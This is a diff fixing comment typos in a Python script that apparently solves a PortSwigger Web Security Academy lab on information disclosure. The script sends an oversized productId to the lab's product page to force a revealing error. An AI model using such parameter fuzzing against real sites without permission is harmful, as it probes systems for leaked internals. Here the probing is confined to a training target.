@@ -9,9 +9,9 @@ Lab link: https://portswigger.net/web-security/information-disclosure/exploiting
 import requests
 import re
 
-lab_id = '0a00008e04128fd183456a5d00f5005d' # change accordign to generated lab_id
+lab_id = '0a00008e04128fd183456a5d00f5005d' # change according to generated lab_id
 
-# Trigger an error response by fuzzing the product page with an productId paramater
+# Trigger an error response by fuzzing the product page with an productId parameter
 uri = f"https://{lab_id}.web-security-academy.net/product?productId=9999999999999999999999999999999999999999999999999"
 r = requests.get(uri)
 
